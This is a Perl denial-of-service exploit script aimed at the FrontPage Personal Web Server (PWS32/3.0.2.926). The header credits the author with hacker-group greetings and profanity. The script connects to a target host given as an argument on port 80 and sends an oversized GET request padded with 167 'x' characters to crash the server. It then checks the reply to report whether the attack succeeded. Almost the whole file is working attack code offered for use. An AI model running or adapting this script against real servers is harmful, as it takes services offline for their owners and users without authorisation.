#!/usr/bin/perl
########################################################
#
# FrontPage-PWS32/3.0.2.926 DoS By Narr0w.
		#
#
							#
# Greetz to: STAR-W0RMS & Legion2000 Group
		#
# Big FUCK to the channel #hacking @EFNET.........	#
#########################################################
use IO::Socket;
if(@ARGV < 1) { die "\nUsage: $0 <host>\n\n"; }
$len=length($ARGV[0]);
if($len >= 64) { die "\nError: Host Length Too Long ($len)...\n"; }
$host = @ARGV[0];
print "Connecting to $host...\t";
$socket = IO::Socket::INET->new(PeerAddr => $host,PeerPort => 80,Proto => "TCP") || die "[FAILED]\n";
print "[  OK  ]\n";
print "Sending x's...\t\t";
print $socket "GET /" . "x"x167 . " HTTP/1.0\n\n";
print "\t[  OK  ]\n";
print "Checking...\t\t\t";
sleep(5);
while(<$socket>) {
chop;
if(/404 Not Found/) {
	print "[FAILED]\n";
	print "\nThis DoS does not work on this server ($host) ...\n";
	close $socket;
	exit(0);
}
else
{
	print "[  OK  ]\n";
	close $socket;
 }
}
exit;